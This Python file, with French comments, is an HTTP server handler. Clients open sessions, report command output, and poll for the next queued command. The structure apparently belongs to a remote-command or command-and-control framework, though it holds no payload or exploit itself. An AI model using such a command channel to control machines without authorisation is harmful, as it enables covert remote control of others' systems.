# server/http_handler.py
import json
from http.server import BaseHTTPRequestHandler
from .messages import decode_message, MessageError
from .sessions import init_session, identify_client
from .commands import pop_command_for
from typing import Optional
from controller.clients import ClientManager

class Handler(BaseHTTPRequestHandler):
    client_manager: Optional[ClientManager] = None

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)

        try:
            msg = decode_message(raw)
        except MessageError as e:
            return self._reply(400, {"error": str(e)})

        # --- init ---
        if msg.raw.get("action") == "init":
            try:
                payload = init_session(
                    ip_private=self.client_address[0],
                    client_manager=self.client_manager,
                )
            except Exception as e:
                return self._reply(400, {"error": str(e)})
            return self._reply(200, payload)

        # --- message normal ---
        try:
            client_id = identify_client(
                session_token=msg.session_token,
                client_id=msg.client_id,
                client_manager=self.client_manager,
            )
        except ValueError as e:
            return self._reply(401, {"error": str(e)})

        if msg.output:
            print(f"\n[{client_id}] >>> {msg.output}")

        cmd = pop_command_for(client_id, self.client_manager)
        payload = {"cmd": cmd.action_type if cmd else ""}
        if cmd:
            payload.update({
                "command_id": cmd.command_id,
                "client_id": cmd.client_id,
            })
        self._reply(200, payload)

    def _reply(self, code, payload):
        body = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        
def make_handler(client_manager: ClientManager):
    """Crée une sous-classe de Handler liée à un ClientManager précis."""
    class BoundHandler(Handler):
        pass
    BoundHandler.client_manager = client_manager
    return BoundHandler